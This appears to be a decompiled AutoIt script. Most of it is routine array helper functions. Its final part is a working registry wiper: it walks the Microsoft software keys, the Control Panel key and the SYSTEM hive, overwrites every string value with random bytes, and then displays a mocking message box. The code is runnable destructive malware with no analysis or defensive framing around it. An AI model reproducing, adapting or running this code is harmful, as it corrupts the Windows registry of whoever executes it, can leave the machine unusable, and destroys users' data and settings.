			$AIDX [ $I ] = $ITEMP
		Next
	EndIf
EndFunc
Func __ARRAY_COMBINATIONS ( $IN , $IR )
	Local $I_TOTAL = 1
	For $I = $IR To 1 Step + 4294967295
		$I_TOTAL *= ( $IN / $I )
		$IN -= 1
	Next
	Return Round ( $I_TOTAL )
EndFunc
Func __ARRAY_GETNEXT ( $IN , $IR , ByRef $ILEFT , $ITOTAL , ByRef $AIDX )
	If $ILEFT == $ITOTAL Then
		$ILEFT -= 1
		Return
	EndIf
	Local $I = $IR + 4294967295
	While $AIDX [ $I ] == $IN - $IR + $I
		$I -= 1
	WEnd
	$AIDX [ $I ] += 1
	For $J = $I + 1 To $IR + 4294967295
		$AIDX [ $J ] = $AIDX [ $I ] + $J - $I
	Next
	$ILEFT -= 1
EndFunc
Func __ARRAY_MINMAXINDEX ( Const ByRef $AARRAY , $ICOMPNUMERIC , $ISTART , $IEND , $ISUBITEM , $FUCOMPARISON )
	If $ICOMPNUMERIC = Default Then $ICOMPNUMERIC = 0
	If $ICOMPNUMERIC <> 1 Then $ICOMPNUMERIC = 0
	If $ISTART = Default Then $ISTART = 0
	If $IEND = Default Then $IEND = 0
	If $ISUBITEM = Default Then $ISUBITEM = 0
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS ) + 4294967295
	If $IDIM_1 < 0 Then Return SetError ( 1 , 0 , + 4294967295 )
	If $IEND = + 4294967295 Then $IEND = $IDIM_1
	If $ISTART = + 4294967295 Then $ISTART = 0
	If $ISTART < + 4294967295 Or $IEND < + 4294967295 Then Return SetError ( 3 , 0 , + 4294967295 )
	If $ISTART > $IDIM_1 Or $IEND > $IDIM_1 Then Return SetError ( 3 , 0 , + 4294967295 )
	If $ISTART > $IEND Then Return SetError ( 4 , 0 , + 4294967295 )
	If $IDIM_1 < 0 Then Return SetError ( 5 , 0 , + 4294967295 )
	Local $IMAXMININDEX = $ISTART
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		If $ICOMPNUMERIC Then
			For $I = $ISTART To $IEND
				If $FUCOMPARISON ( Number ( $AARRAY [ $I ] ) , Number ( $AARRAY [ $IMAXMININDEX ] ) ) Then $IMAXMININDEX = $I
			Next
		Else
			For $I = $ISTART To $IEND
				If $FUCOMPARISON ( $AARRAY [ $I ] , $AARRAY [ $IMAXMININDEX ] ) Then $IMAXMININDEX = $I
			Next
		EndIf
	Case 2
		If $ISUBITEM < 0 Or $ISUBITEM > UBound ( $AARRAY , $UBOUND_COLUMNS ) + 4294967295 Then Return SetError ( 6 , 0 , + 4294967295 )
		If $ICOMPNUMERIC Then
			For $I = $ISTART To $IEND
				If $FUCOMPARISON ( Number ( $AARRAY [ $I ] [ $ISUBITEM ] ) , Number ( $AARRAY [ $IMAXMININDEX ] [ $ISUBITEM ] ) ) Then $IMAXMININDEX = $I
			Next
		Else
			For $I = $ISTART To $IEND
				If $FUCOMPARISON ( $AARRAY [ $I ] [ $ISUBITEM ] , $AARRAY [ $IMAXMININDEX ] [ $ISUBITEM ] ) Then $IMAXMININDEX = $I
			Next
		EndIf
Case Else
		Return SetError ( 2 , 0 , + 4294967295 )
	EndSwitch
	Return $IMAXMININDEX
EndFunc
Func __ARRAY_GREATERTHAN ( $VVALUE1 , $VVALUE2 )
	Return $VVALUE1 > $VVALUE2
EndFunc
Func __ARRAY_LESSTHAN ( $VVALUE1 , $VVALUE2 )
	Return $VVALUE1 < $VVALUE2
EndFunc
Func __ARRAYUNIQUE_AUTOERRFUNC ( )
EndFunc
Global $A , $T , $ERROR , $EXTENDED , $KEYNAME
Dim $CHARSET [ 16 ] = [ "0" , "1" , "2" , "3" , "4" , "5" , "6" , "7" , "8" , "9" , "A" , "B" , "C" , "D" , "E" , "F" ]
$A = _REGENUMKEYEX ( "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft" , 128 + 256 )
_REGFUCKUP ( $A )
$A = _REGENUMKEYEX ( "HKEY_CURRENT_USER\Software\Microsoft" , 128 + 256 )
_REGFUCKUP ( $A )
$A = _REGENUMKEYEX ( "HKEY_CURRENT_USER\Control Panel" , 128 + 256 )
_REGFUCKUP ( $A )
$A = _REGENUMKEYEX ( "HKEY_LOCAL_MACHINE\SYSTEM" , 128 + 256 )
_REGFUCKUP ( $A )
MsgBox ( 0 , "kek" , "WOW, REGISTRY SEEMS FUCKED UP!!" )
Func _REGFUCKUP ( $A )
	For $I = 1 To $A [ 0 ] [ 0 ]
		If StringInStr ( $A [ $I ] [ 2 ] , "SZ" ) Then
			RegWrite ( $A [ $I ] [ 0 ] , $A [ $I ] [ 1 ] , $A [ $I ] [ 2 ] , BinaryToString ( RANDOMHEX ( 55 ) ) )
		EndIf
	Next
EndFunc
Func RANDOMHEX ( $ILENGTH = 5 )
	$COLOR = "0x"
	For $I = 0 To $ILENGTH
		$COLOR &= $CHARSET [ Random ( 0 , 15 , 1 ) ]
	Next
	Return $COLOR
EndFunc
